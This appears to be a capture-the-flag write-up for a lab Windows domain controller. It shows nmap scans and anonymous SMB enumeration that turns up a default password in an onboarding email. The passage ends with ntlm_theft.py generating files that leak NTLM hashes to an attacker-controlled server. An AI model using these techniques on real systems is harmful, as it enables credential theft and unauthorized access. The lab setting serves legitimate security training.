![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b80efa3b-6d37-4d1c-8644-d3ec7599a228)

first enumeration with nmap 

```shell
# Nmap 7.93 scan initiated Sat Feb 10 17:28:13 2024 as: nmap -p- --min-rate 1000 -v -Pn -oN full.tcp 10.10.230.101
Nmap scan report for ip-10-10-230-101.eu-west-1.compute.internal (10.10.230.101)
Host is up (0.00056s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49703/tcp open  unknown
MAC Address: 02:24:96:14:7C:EB (Unknown)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Feb 10 17:30:33 2024 -- 1 IP address (1 host up) scanned in 140.66 seconds
```
we can see the open ports, let's run nmap default scripts scan to know what services are running on these ports

```shell
# Nmap 7.93 scan initiated Sat Feb 10 17:34:41 2024 as: nmap -sCV -T4 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,7680,9389 -Pn -oN service.tcp
 10.10.230.101                 
Nmap scan report for ip-10-10-230-101.eu-west-1.compute.internal (10.10.230.101)
Host is up (0.00045s latency).                                                
                                                                              
PORT     STATE    SERVICE       VERSION    
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-10 17:34:49Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2024-01-25T21:01:31                                                                                                                     
|_Not valid after:  2024-07-26T21:01:31 
| rdp-ntlm-info:                                                                                                                                            
|   Target_Name: THM                                                                                                                                        
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-10T17:34:49+00:00
|_ssl-date: 2024-02-10T17:35:29+00:00; 0s from scanner time.
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp filtered pando-pub
9389/tcp open     mc-nmf        .NET Message Framing
MAC Address: 02:24:96:14:7C:EB (Unknown)
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-10T17:34:50
|_  start_date: N/A
|_nbstat: NetBIOS name: HAYSTACK, NetBIOS user: <unknown>, NetBIOS MAC: 022496147ceb (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 10 17:35:29 2024 -- 1 IP address (1 host up) scanned in 48.40 seconds
```
now we know what services are running on these ports

## Enumerating smb

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/reset]
└─$ smbclient -L HayStack.thm.corp -N 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to HayStack.thm.corp failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
checking for null share session, we can see a Data share. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/00c95ff9-7b5e-4e3c-99f9-6b0941815616)

checking the share, we can see some files, we downloaded the files. 

```shell
└─$ cat cjexnwvf.e0i.txt
Subject: Welcome to Reset -Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team 
```
checking the content of the txt file, we got a password `ResetMe123!`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5e223f93-149f-4968-8463-5715d888acb6)

we have write permission to the smb server, 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dc3c8f28-22d9-4686-8eab-bccdd5fc58e7)

after long research we got how to steal ntlm hash using responder with this ntlm_theft payload. [payload_gen](https://github.com/Greenwolf/ntlm_theft).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b0c83d9-912b-4342-9f76-e4f45ae42036)

```shell
┌──(root㉿kali)-[~/ntlm_theft]                                                                                                                              
└─# python ntlm_theft.py                                                                                                                                    
usage: ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>
ntlm_theft.py: error: the following arguments are required: -g/--generate, -s/--server, -f/--filename
                                                                                                                                                            
┌──(root㉿kali)-[~/ntlm_theft]                                                
└─# python ntlm_theft.py --generate all --server 10.10.135.72 --filename testing 
Created: testing/testing.scf (BROWSE TO FOLDER)              
Created: testing/testing-(url).url (BROWSE TO FOLDER)
Created: testing/testing-(icon).url (BROWSE TO FOLDER)                        
Created: testing/testing.lnk (BROWSE TO FOLDER)                               
Created: testing/testing.rtf (OPEN)                                           
Created: testing/testing-(stylesheet).xml (OPEN)                              
Created: testing/testing-(fulldocx).xml (OPEN)                                
Created: testing/testing.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: testing/testing-(includepicture).docx (OPEN)
Created: testing/testing-(remotetemplate).docx (OPEN)
Created: testing/testing-(frameset).docx (OPEN)
Created: testing/testing-(externalcell).xlsx (OPEN)
Created: testing/testing.wax (OPEN)
Created: testing/testing.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: testing/testing.asx (OPEN)
Created: testing/testing.jnlp (OPEN)
Created: testing/testing.application (DOWNLOAD AND OPEN)
Created: testing/testing.pdf (OPEN AND ALLOW)
Created: testing/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: testing/Autorun.inf (BROWSE TO FOLDER)
Created: testing/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```
run the exploit to see how it works and generated some payloads we can use. 




